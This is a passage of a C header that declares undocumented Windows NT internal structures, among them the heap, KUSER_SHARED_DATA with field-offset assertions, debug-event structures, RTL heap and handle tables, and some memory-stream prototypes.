} HEAP_COUNTERS, *PHEAP_COUNTERS;		// <size 0x48>

typedef struct _HEAP
{
	HEAP_ENTRY Entry;
	ULONG SegmentSignature;
	ULONG SegmentFlags;
	LIST_ENTRY SegmentListEntry;
	struct _HEAP* Heap;
	PVOID BaseAddress;
	ULONG NumberOfPages;
	PHEAP_ENTRY FirstEntry;
	PHEAP_ENTRY LastValidEntry;
	ULONG NumberOfUnCommittedPages;
	ULONG NumberOfUnCommittedRanges;
	USHORT SegmentAllocatorBackTraceIndex;
	USHORT Reserved;
	LIST_ENTRY UCRSegmentList;
	ULONG Flags;
	ULONG ForceFlags;
	ULONG CompatibilityFlags;
	ULONG EncodeFlagMask;
	HEAP_ENTRY Encoding;
	ULONG PointerKey;
	ULONG Interceptor;
	ULONG VirtualMemoryThreshold;
	ULONG Signature;
	ULONG SegmentReserve;
	ULONG SegmentCommit;
	ULONG DeCommitFreeBlockThreshold;
	ULONG DeCommitTotalFreeThreshold;
	ULONG TotalFreeSize;
	ULONG MaximumAllocationSize;
	USHORT ProcessHeapsListIndex;
	USHORT HeaderValidateLength;
	PVOID HeaderValidateCopy;
	USHORT NextAvailableTagIndex;
	USHORT MaximumTagIndex;
	PHEAP_TAG_ENTRY TagEntries;
	LIST_ENTRY UCRList;
	ULONG AlignRound;
	ULONG AlignMask;
	LIST_ENTRY VirtualAllocdBlocks;
	LIST_ENTRY SegmentList;
	USHORT AllocatorBackTraceIndex;
	ULONG NonDedicatedListLength;
	PVOID BlocksIndex;
	PVOID UCRIndex;
	PHEAP_PSEUDO_TAG_ENTRY PseudoTagEntries;
	LIST_ENTRY FreeLists;
	PHEAP_LOCK LockVariable;
	LONG * CommitRoutine;		// <<-- http://www.nirsoft.net/kernel_struct/vista/HEAP.html
	PVOID FrontEndHeap;
	USHORT FrontHeapLockCount;
	UCHAR FrontEndHeapType;
	HEAP_COUNTERS Counters;
	HEAP_TUNING_PARAMETERS TuningParameters;
} HEAP, *PHEAP;		// <size 0x130>

typedef struct _HEAP_FREE_ENTRY_EXTRA
{
	USHORT TagIndex;
	USHORT FreeBackTraceIndex;
} HEAP_FREE_ENTRY_EXTRA, *PHEAP_FREE_ENTRY_EXTRA;		// <size 0x4>

typedef struct _HEAP_ENTRY_EXTRA
{
	USHORT AllocatorBackTraceIndex;
	USHORT TagIndex;
	ULONG Settable;
	ULONG64 ZeroInit;
} HEAP_ENTRY_EXTRA, *PHEAP_ENTRY_EXTRA;		// <size 0x8>

typedef struct _HEAP_VIRTUAL_ALLOC_ENTRY
{
	LIST_ENTRY Entry;
	HEAP_ENTRY_EXTRA ExtraStuff;
	ULONG CommitSize;
	ULONG ReserveSize;
	HEAP_ENTRY BusyBlock;
} HEAP_VIRTUAL_ALLOC_ENTRY, *PHEAP_VIRTUAL_ALLOC_ENTRY;		// <size 0x20>

//
// Known extended CPU state feature IDs
//

// #define XSTATE_LEGACY_FLOATING_POINT        0
// #define XSTATE_LEGACY_SSE                   1
// #define XSTATE_GSSE                         2
// 
// #define XSTATE_MASK_LEGACY_FLOATING_POINT   (1i64 << (XSTATE_LEGACY_FLOATING_POINT))
// #define XSTATE_MASK_LEGACY_SSE              (1i64 << (XSTATE_LEGACY_SSE))
// #define XSTATE_MASK_LEGACY                  (XSTATE_MASK_LEGACY_FLOATING_POINT | XSTATE_MASK_LEGACY_SSE)
// #define XSTATE_MASK_GSSE                    (1i64 << (XSTATE_GSSE))
// 
// #define MAXIMUM_XSTATE_FEATURES             64


typedef enum _HARDERROR_RESPONSE_OPTION
{
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem,
	OptionOkNoWait,
	OptionCancelTryContinue
} HARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE
{
	ResponseReturnToCaller,
	ResponseNotHandled,
	ResponseAbort,
	ResponseCancel,
	ResponseIgnore,
	ResponseNo,
	ResponseOk,
	ResponseRetry,
	ResponseYes,
	ResponseTryAgain,
	ResponseContinue
} HARDERROR_RESPONSE;

typedef enum _ALTERNATIVE_ARCHITECTURE_TYPE
{
	StandardDesign,                 // None == 0 == standard design
	NEC98x86,                       // NEC PC98xx series on X86
	EndAlternatives                 // past end of known alternatives
} ALTERNATIVE_ARCHITECTURE_TYPE;

#define NX_SUPPORT_POLICY_ALWAYSOFF 0
#define NX_SUPPORT_POLICY_ALWAYSON 1
#define NX_SUPPORT_POLICY_OPTIN 2
#define NX_SUPPORT_POLICY_OPTOUT 3

#define PROCESSOR_FEATURE_MAX 64
#define MAX_WOW64_SHARED_ENTRIES 16

#if defined(_MSC_VER) && (_MSC_VER < 1300)

#define XSTATE_LEGACY_FLOATING_POINT        0
#define XSTATE_LEGACY_SSE                   1
#define XSTATE_GSSE                         2

#define XSTATE_MASK_LEGACY_FLOATING_POINT   (1i64 << (XSTATE_LEGACY_FLOATING_POINT))
#define XSTATE_MASK_LEGACY_SSE              (1i64 << (XSTATE_LEGACY_SSE))
#define XSTATE_MASK_LEGACY                  (XSTATE_MASK_LEGACY_FLOATING_POINT | XSTATE_MASK_LEGACY_SSE)
#define XSTATE_MASK_GSSE                    (1i64 << (XSTATE_GSSE))

#define MAXIMUM_XSTATE_FEATURES             64

//
// Extended processor state configuration
//
#if defined(_WINNT_) && defined(_MSC_VER) && _MSC_VER < 1300
typedef struct _XSTATE_FEATURE {
    DWORD Offset;
    DWORD Size;
} XSTATE_FEATURE, *PXSTATE_FEATURE;

typedef struct _XSTATE_CONFIGURATION {
    // Mask of enabled features
    DWORD64 EnabledFeatures;

    // Total size of the save area
    DWORD Size;

    DWORD OptimizedSave : 1;

    // List of features (
    XSTATE_FEATURE Features[MAXIMUM_XSTATE_FEATURES];

} XSTATE_CONFIGURATION, *PXSTATE_CONFIGURATION;
#endif

#ifndef _WINDOWS_
typedef enum _HEAP_INFORMATION_CLASS {
	HeapCompatibilityInformation
} HEAP_INFORMATION_CLASS;
#endif //_WINDOWS_

#endif

typedef struct _KUSER_SHARED_DATA
{
    ULONG TickCountLowDeprecated;
    ULONG TickCountMultiplier;

    volatile KSYSTEM_TIME InterruptTime;
    volatile KSYSTEM_TIME SystemTime;
    volatile KSYSTEM_TIME TimeZoneBias;

    USHORT ImageNumberLow;
    USHORT ImageNumberHigh;

    WCHAR NtSystemRoot[260];

    ULONG MaxStackTraceDepth;

    ULONG CryptoExponent;

    ULONG TimeZoneId;
    ULONG LargePageMinimum;
    ULONG Reserved2[7];

    ULONG NtProductType;
    BOOLEAN ProductTypeIsValid;

    ULONG NtMajorVersion;
    ULONG NtMinorVersion;

    BOOLEAN ProcessorFeatures[PROCESSOR_FEATURE_MAX];

    ULONG Reserved1;
    ULONG Reserved3;

    volatile ULONG TimeSlip;

    ALTERNATIVE_ARCHITECTURE_TYPE AlternativeArchitecture;

    LARGE_INTEGER SystemExpirationDate;

    ULONG SuiteMask;

    BOOLEAN KdDebuggerEnabled;

    UCHAR NXSupportPolicy;

    volatile ULONG ActiveConsoleId;

    volatile ULONG DismountCount;

    ULONG ComPlusPackage;

    ULONG LastSystemRITEventTickCount;

    ULONG NumberOfPhysicalPages;

    BOOLEAN SafeBootMode;
    union
    {
        UCHAR TscQpcData;
        struct
        {
            UCHAR TscQpcEnabled : 1;
            UCHAR TscQpcSpareFlag : 1;
            UCHAR TscQpcShift : 6;
        };
    };
    UCHAR TscQpcPad[2];

    union
    {
        ULONG TraceLogging;
        ULONG SharedDataFlags;
        struct
        {
            ULONG DbgErrorPortPresent : 1;
            ULONG DbgElevationEnabled : 1;
            ULONG DbgVirtEnabled : 1;
            ULONG DbgInstallerDetectEnabled : 1;
            ULONG DbgSystemDllRelocated : 1;
            ULONG DbgDynProcessorEnabled : 1;
            ULONG DbgSEHValidationEnabled : 1;
            ULONG SpareBits : 25;
        };
    };
    ULONG DataFlagsPad[1];

    ULONGLONG TestRetInstruction;
    ULONG SystemCall;
    ULONG SystemCallReturn;
    ULONGLONG SystemCallPad[3];

    union
    {
        volatile KSYSTEM_TIME TickCount;
        volatile ULONG64 TickCountQuad;
        struct
        {
            ULONG ReservedTickCountOverlay[3];
            ULONG TickCountPad[1];
        };
    };

    ULONG Cookie;

    // Entries below all invalid below Windows Vista

    ULONG CookiePad[1];

    LONGLONG ConsoleSessionForegroundProcessId;

    ULONG Wow64SharedInformation[MAX_WOW64_SHARED_ENTRIES];

    USHORT UserModeGlobalLogger[16];
    ULONG ImageFileExecutionOptions;

    ULONG LangGenerationCount;

    union
    {
        ULONGLONG AffinityPad; // only valid on Windows Vista
        ULONG_PTR ActiveProcessorAffinity; // only valid on Windows Vista
        ULONGLONG Reserved5;
    };
    volatile ULONG64 InterruptTimeBias;
    volatile ULONG64 TscQpcBias;

    volatile ULONG ActiveProcessorCount;
    volatile USHORT ActiveGroupCount;
    USHORT Reserved4;

    volatile ULONG AitSamplingValue;
    volatile ULONG AppCompatFlag;

    ULONGLONG SystemDllNativeRelocation;
    ULONG SystemDllWowRelocation;

    ULONG XStatePad[1];
    XSTATE_CONFIGURATION XState;
} KUSER_SHARED_DATA, *PKUSER_SHARED_DATA;

C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TickCountMultiplier) == 0x4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, InterruptTime) == 0x8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemTime) == 0x14);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeZoneBias) == 0x20);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ImageNumberLow) == 0x2c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ImageNumberHigh) == 0x2e);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtSystemRoot) == 0x30);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, MaxStackTraceDepth) == 0x238);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, CryptoExponent) == 0x23c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeZoneId) == 0x240);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, LargePageMinimum) == 0x244);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved2) == 0x248);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtProductType) == 0x264);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ProductTypeIsValid) == 0x268);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtMajorVersion) == 0x26c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtMinorVersion) == 0x270);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ProcessorFeatures) == 0x274);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved1) == 0x2b4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved3) == 0x2b8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeSlip) == 0x2bc);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, AlternativeArchitecture) == 0x2c0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemExpirationDate) == 0x2c8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SuiteMask) == 0x2d0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, KdDebuggerEnabled) == 0x2d4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NXSupportPolicy) == 0x2d5);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ActiveConsoleId) == 0x2d8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, DismountCount) == 0x2dC);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ComPlusPackage) == 0x2e0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, LastSystemRITEventTickCount) == 0x2e4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NumberOfPhysicalPages) == 0x2e8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SafeBootMode) == 0x2ec);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TraceLogging) == 0x2f0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TestRetInstruction) == 0x2f8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemCall) == 0x300);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemCallReturn) == 0x304);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemCallPad) == 0x308);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TickCount) == 0x320);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TickCountQuad) == 0x320);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Cookie) == 0x330);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ConsoleSessionForegroundProcessId) == 0x338);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Wow64SharedInformation) == 0x340);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, UserModeGlobalLogger) == 0x380);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ImageFileExecutionOptions) == 0x3a0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, LangGenerationCount) == 0x3a4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, InterruptTimeBias) == 0x3b0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, UserModeGlobalLogger) == 0x380);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ImageFileExecutionOptions) == 0x3a0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, LangGenerationCount) == 0x3a4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved5) == 0x3a8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, InterruptTimeBias) == 0x3b0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TscQpcBias) == 0x3b8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ActiveProcessorCount) == 0x3c0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ActiveGroupCount) == 0x3c4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved4) == 0x3c6);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, AitSamplingValue) == 0x3c8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, AppCompatFlag) == 0x3cc);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemDllNativeRelocation) == 0x3d0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemDllWowRelocation) == 0x3d8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, XState) == 0x3e0);

#define SHARED_USER_DATA_VA 0x7FFE0000
#define USER_SHARED_DATA ((KUSER_SHARED_DATA * const)SHARED_USER_DATA_VA)

__inline struct _KUSER_SHARED_DATA * GetKUserSharedData() { return (USER_SHARED_DATA); }

__forceinline ULONG NtGetTickCount() { return (ULONG) ((USER_SHARED_DATA->TickCountQuad * USER_SHARED_DATA->TickCountMultiplier) >> 24); }

//added 20/03/2011
#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002
#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004

//added 20/03/2011
typedef struct _RTL_PROCESS_REFLECTION_INFORMATION
{
	HANDLE Process;
	HANDLE Thread;
	CLIENT_ID ClientId;
} RTL_PROCESS_REFLECTION_INFORMATION, *PRTL_PROCESS_REFLECTION_INFORMATION;

//FIXED 21.02.2011 size for x64
typedef struct _VM_COUNTERS {
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
} VM_COUNTERS;
typedef VM_COUNTERS *PVM_COUNTERS;

#if (_MSC_VER < 1300) && !defined(_WINDOWS_)
typedef struct _IO_COUNTERS {
	ULONGLONG  ReadOperationCount;
	ULONGLONG  WriteOperationCount;
	ULONGLONG  OtherOperationCount;
	ULONGLONG ReadTransferCount;
	ULONGLONG WriteTransferCount;
	ULONGLONG OtherTransferCount;
} IO_COUNTERS;
typedef IO_COUNTERS *PIO_COUNTERS;
#endif

// SystemProcessesAndThreadsInformation
//FIXED 21.02.2011 size for x64 (and as well for x86 too)
typedef struct _SYSTEM_PROCESSES_INFORMATION {
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	LARGE_INTEGER SpareLi1;
	LARGE_INTEGER SpareLi2;
	LARGE_INTEGER SpareLi3;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR PageDirectoryBase;
	VM_COUNTERS VmCounters;
	IO_COUNTERS IoCounters;
	SYSTEM_THREAD_INFORMATION Threads[1];
} SYSTEM_PROCESSES_INFORMATION, *PSYSTEM_PROCESSES_INFORMATION;

#define SIZEOF_BP_BUFFER 32
#define LPC_BUFFER_SIZE 0x130

typedef struct _DBGKM_EXCEPTION
{
	EXCEPTION_RECORD ExceptionRecord;
	ULONG FirstChance;
} DBGKM_EXCEPTION, *PDBGKM_EXCEPTION;

typedef struct _DBGKM_CREATE_THREAD
{
	ULONG SubSystemKey;
	PVOID StartAddress;
} DBGKM_CREATE_THREAD, *PDBGKM_CREATE_THREAD;

typedef struct _DBGKM_CREATE_PROCESS
{
	ULONG SubSystemKey;
	HANDLE FileHandle;
	PVOID BaseOfImage;
	ULONG DebugInfoFileOffset;
	ULONG DebugInfoSize;
	DBGKM_CREATE_THREAD InitialThread;
} DBGKM_CREATE_PROCESS, *PDBGKM_CREATE_PROCESS;

typedef struct _DBGKM_EXIT_THREAD
{
	NTSTATUS ExitStatus;
} DBGKM_EXIT_THREAD, *PDBGKM_EXIT_THREAD;

typedef struct _DBGKM_EXIT_PROCESS
{
	NTSTATUS ExitStatus;
} DBGKM_EXIT_PROCESS, *PDBGKM_EXIT_PROCESS;

typedef struct _DBGKM_LOAD_DLL
{
	HANDLE FileHandle;
	PVOID BaseOfDll;
	ULONG DebugInfoFileOffset;
	ULONG DebugInfoSize;
	PVOID NamePointer;
} DBGKM_LOAD_DLL, *PDBGKM_LOAD_DLL;

typedef struct _DBGKM_UNLOAD_DLL
{
	PVOID BaseAddress;
} DBGKM_UNLOAD_DLL, *PDBGKM_UNLOAD_DLL;

typedef enum _DBG_STATE
{
	DbgIdle,
	DbgReplyPending,
	DbgCreateThreadStateChange,
	DbgCreateProcessStateChange,
	DbgExitThreadStateChange,
	DbgExitProcessStateChange,
	DbgExceptionStateChange,
	DbgBreakpointStateChange,
	DbgSingleStepStateChange,
	DbgLoadDllStateChange,
	DbgUnloadDllStateChange
} DBG_STATE, *PDBG_STATE;

typedef struct _DBGUI_CREATE_THREAD
{
	HANDLE HandleToThread;
	DBGKM_CREATE_THREAD NewThread;
} DBGUI_CREATE_THREAD, *PDBGUI_CREATE_THREAD;

typedef struct _DBGUI_CREATE_PROCESS
{
	HANDLE HandleToProcess;
	HANDLE HandleToThread;
	DBGKM_CREATE_PROCESS NewProcess;
} DBGUI_CREATE_PROCESS, *PDBGUI_CREATE_PROCESS;

typedef struct _DBGUI_WAIT_STATE_CHANGE
{
	DBG_STATE NewState;
	CLIENT_ID AppClientId;
	union
	{
		DBGKM_EXCEPTION Exception;
		DBGUI_CREATE_THREAD CreateThread;
		DBGUI_CREATE_PROCESS CreateProcessInfo;
		DBGKM_EXIT_THREAD ExitThread;
		DBGKM_EXIT_PROCESS ExitProcess;
		DBGKM_LOAD_DLL LoadDll;
		DBGKM_UNLOAD_DLL UnloadDll;
	} StateInfo;
} DBGUI_WAIT_STATE_CHANGE, *PDBGUI_WAIT_STATE_CHANGE;

#define DEBUG_READ_EVENT 0x0001
#define DEBUG_PROCESS_ASSIGN 0x0002
#define DEBUG_SET_INFORMATION 0x0004
#define DEBUG_QUERY_INFORMATION 0x0008
#define DEBUG_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | \
	DEBUG_READ_EVENT | DEBUG_PROCESS_ASSIGN | DEBUG_SET_INFORMATION | \
	DEBUG_QUERY_INFORMATION)

#define DEBUG_KILL_ON_CLOSE 0x1

typedef enum _DEBUGOBJECTINFOCLASS
{
	DebugObjectFlags = 1,
	MaxDebugObjectInfoClass
} DEBUGOBJECTINFOCLASS, *PDEBUGOBJECTINFOCLASS;


//added 21/03/2011
//begin
typedef struct _RTL_HEAP_TAG_INFO
{
	ULONG NumberOfAllocations;
	ULONG NumberOfFrees;
	SIZE_T BytesAllocated;
} RTL_HEAP_TAG_INFO, *PRTL_HEAP_TAG_INFO;

#define RTL_HEAP_MAKE_TAG HEAP_MAKE_TAG_FLAGS
#define MAKE_TAG( t ) (RTL_HEAP_MAKE_TAG( NtdllBaseTag, t ))

typedef NTSTATUS (NTAPI *PRTL_ENUM_HEAPS_ROUTINE)(
	IN PVOID HeapHandle,
	IN PVOID Parameter
	);

typedef struct _RTL_HEAP_USAGE_ENTRY
{
	struct _RTL_HEAP_USAGE_ENTRY *Next;
	PVOID Address;
	SIZE_T Size;
	USHORT AllocatorBackTraceIndex;
	USHORT TagIndex;
} RTL_HEAP_USAGE_ENTRY, *PRTL_HEAP_USAGE_ENTRY;

typedef struct _RTL_HEAP_USAGE
{
	ULONG Length;
	SIZE_T BytesAllocated;
	SIZE_T BytesCommitted;
	SIZE_T BytesReserved;
	SIZE_T BytesReservedMaximum;
	PRTL_HEAP_USAGE_ENTRY Entries;
	PRTL_HEAP_USAGE_ENTRY AddedEntries;
	PRTL_HEAP_USAGE_ENTRY RemovedEntries;
	ULONG_PTR Reserved[8];
} RTL_HEAP_USAGE, *PRTL_HEAP_USAGE;

#define HEAP_USAGE_ALLOCATED_BLOCKS HEAP_REALLOC_IN_PLACE_ONLY
#define HEAP_USAGE_FREE_BUFFER HEAP_ZERO_MEMORY

typedef struct _RTL_HEAP_WALK_ENTRY
{
	PVOID DataAddress;
	SIZE_T DataSize;
	UCHAR OverheadBytes;
	UCHAR SegmentIndex;
	USHORT Flags;
	union
	{
		struct
		{
			SIZE_T Settable;
			USHORT TagIndex;
			USHORT AllocatorBackTraceIndex;
			ULONG Reserved[2];
		} Block;
		struct
		{
			ULONG CommittedSize;
			ULONG UnCommittedSize;
			PVOID FirstEntry;
			PVOID LastEntry;
		} Segment;
	};
} RTL_HEAP_WALK_ENTRY, *PRTL_HEAP_WALK_ENTRY;

#define HeapDebuggingInformation 0x80000002

typedef NTSTATUS (NTAPI *PRTL_HEAP_LEAK_ENUMERATION_ROUTINE)(
	IN LONG Reserved,
	IN PVOID HeapHandle,
	IN PVOID BaseAddress,
	IN SIZE_T BlockSize,
	IN ULONG StackTraceDepth,
	IN PVOID *StackTrace
	);

typedef struct _HEAP_DEBUGGING_INFORMATION
{
	PVOID InterceptorFunction;
	USHORT InterceptorValue;
	ULONG ExtendedOptions;
	ULONG StackTraceDepth;
	SIZE_T MinTotalBlockSize;
	SIZE_T MaxTotalBlockSize;
	PRTL_HEAP_LEAK_ENUMERATION_ROUTINE HeapLeakEnumerationRoutine;
} HEAP_DEBUGGING_INFORMATION, *PHEAP_DEBUGGING_INFORMATION;

// added 11/04/2011
#define PREALLOCATE_EVENT_MASK  0x80000000

#define RtlInitializeLockRoutine(L) RtlInitializeCriticalSectionAndSpinCount((PRTL_CRITICAL_SECTION)(L),(PREALLOCATE_EVENT_MASK | 4000))
#define RtlAcquireLockRoutine(L)    RtlEnterCriticalSection((PRTL_CRITICAL_SECTION)(L))
#define RtlReleaseLockRoutine(L)    RtlLeaveCriticalSection((PRTL_CRITICAL_SECTION)(L))
#define RtlDeleteLockRoutine(L)     RtlDeleteCriticalSection((PRTL_CRITICAL_SECTION)(L))

typedef struct _RTL_MEMORY_ZONE_SEGMENT
{
	struct _RTL_MEMORY_ZONE_SEGMENT *NextSegment;
	SIZE_T Size;
	PVOID Next;
	PVOID Limit;
} RTL_MEMORY_ZONE_SEGMENT, *PRTL_MEMORY_ZONE_SEGMENT;

#if defined(_WINNT_) && defined(_MSC_VER) && (_MSC_VER < 1300)
typedef struct _RTL_SRWLOCK {                            
	PVOID Ptr;                                       
} RTL_SRWLOCK, *PRTL_SRWLOCK; 
#endif

typedef struct _RTL_MEMORY_ZONE
{
	RTL_MEMORY_ZONE_SEGMENT Segment;
	RTL_SRWLOCK Lock;
	ULONG LockCount;
	PRTL_MEMORY_ZONE_SEGMENT FirstSegment;
} RTL_MEMORY_ZONE, *PRTL_MEMORY_ZONE;

typedef struct _RTL_PROCESS_VERIFIER_OPTIONS
{
	ULONG SizeStruct;
	ULONG Option;
	UCHAR OptionData[1];
} RTL_PROCESS_VERIFIER_OPTIONS, *PRTL_PROCESS_VERIFIER_OPTIONS;

typedef struct _RTL_PROCESS_LOCKS {
	ULONG NumberOfLocks;
	RTL_PROCESS_LOCK_INFORMATION Locks[ 1 ];
} RTL_PROCESS_LOCKS, *PRTL_PROCESS_LOCKS;

#define MAX_STACK_DEPTH 32

typedef struct _RTL_PROCESS_BACKTRACE_INFORMATION {
	PCHAR SymbolicBackTrace;
	ULONG TraceCount;
	USHORT Index;
	USHORT Depth;
	PVOID BackTrace[ MAX_STACK_DEPTH ];
} RTL_PROCESS_BACKTRACE_INFORMATION, *PRTL_PROCESS_BACKTRACE_INFORMATION;

typedef struct _RTL_PROCESS_BACKTRACES {
	ULONG CommittedMemory;
	ULONG ReservedMemory;
	ULONG NumberOfBackTraceLookups;
	ULONG NumberOfBackTraces;
	RTL_PROCESS_BACKTRACE_INFORMATION BackTraces[ 1 ];
} RTL_PROCESS_BACKTRACES, *PRTL_PROCESS_BACKTRACES;

typedef struct _RTL_DEBUG_INFORMATION
{
	HANDLE SectionHandleClient;
	PVOID ViewBaseClient;
	PVOID ViewBaseTarget;
	ULONG_PTR ViewBaseDelta;
	HANDLE EventPairClient;
	HANDLE EventPairTarget;
	HANDLE TargetProcessId;
	HANDLE TargetThreadHandle;
	ULONG Flags;
	SIZE_T OffsetFree;
	SIZE_T CommitSize;
	SIZE_T ViewSize;
	union
	{
		PRTL_PROCESS_MODULES Modules;
		PRTL_PROCESS_MODULE_INFORMATION_EX *ModulesEx;
	};
	PRTL_PROCESS_BACKTRACES BackTraces;
	PRTL_PROCESS_HEAPS Heaps;
	PRTL_PROCESS_LOCKS Locks;
	PVOID SpecificHeap;
	HANDLE TargetProcessHandle;
	PRTL_PROCESS_VERIFIER_OPTIONS VerifierOptions;
	PVOID ProcessHeap;
	HANDLE CriticalSectionHandle;
	HANDLE CriticalSectionOwnerThread;
	PVOID Reserved[4];
} RTL_DEBUG_INFORMATION, *PRTL_DEBUG_INFORMATION;

//added 21/03/2011
//end


// added: 22/04/2011 - RtlStream
typedef struct _RTL_MEMORY_STREAM_DATA *PRTL_MEMORY_STREAM_DATA;
typedef struct _RTL_MEMORY_STREAM_WITH_VTABLE *PRTL_MEMORY_STREAM_WITH_VTABLE;
typedef struct _RTL_OUT_OF_PROCESS_MEMORY_STREAM_DATA *PRTL_OUT_OF_PROCESS_MEMORY_STREAM_DATA;

HRESULT
NTAPI
RtlReleaseMemoryStream(
	PRTL_MEMORY_STREAM_WITH_VTABLE MemoryStream
	);

HRESULT
NTAPI
RtlSetMemoryStreamSize(
	PRTL_MEMORY_STREAM_WITH_VTABLE MemoryStream,
	ULARGE_INTEGER ULargeInteger
	);

HRESULT
NTAPI
RtlCommitMemoryStream(
	PRTL_MEMORY_STREAM_WITH_VTABLE MemoryStream,
	ULONG NewStream
	);

HRESULT
NTAPI
RtlRevertMemoryStream(
	PRTL_MEMORY_STREAM_WITH_VTABLE MemoryStream
	);

NTSTATUS
NTAPI
RtlCopySecurityDescriptor(
	PSECURITY_DESCRIPTOR SourceDescriptor,
	PSECURITY_DESCRIPTOR DestinationDescriptor
	);


typedef struct _RTL_HANDLE_TABLE_ENTRY
{
	union
	{
		ULONG Flags;
		struct _RTL_HANDLE_TABLE_ENTRY *NextFree;
	};
} RTL_HANDLE_TABLE_ENTRY, *PRTL_HANDLE_TABLE_ENTRY;

#define RTL_HANDLE_ALLOCATED (USHORT)0x0001

typedef struct _RTL_HANDLE_TABLE
{
	ULONG MaximumNumberOfHandles;
	ULONG SizeOfHandleTableEntry;
	ULONG Reserved[2];
	PRTL_HANDLE_TABLE_ENTRY FreeHandles;
	PRTL_HANDLE_TABLE_ENTRY CommittedHandles;
	PRTL_HANDLE_TABLE_ENTRY UnCommittedHandles;
	PRTL_HANDLE_TABLE_ENTRY MaxReservedHandles;
} RTL_HANDLE_TABLE, *PRTL_HANDLE_TABLE;

#if defined(_WINNT_) && (_MSC_VER < 1300) && !defined(_WINDOWS_)
typedef struct _JOB_SET_ARRAY {
    HANDLE JobHandle;   // Handle to job object to insert
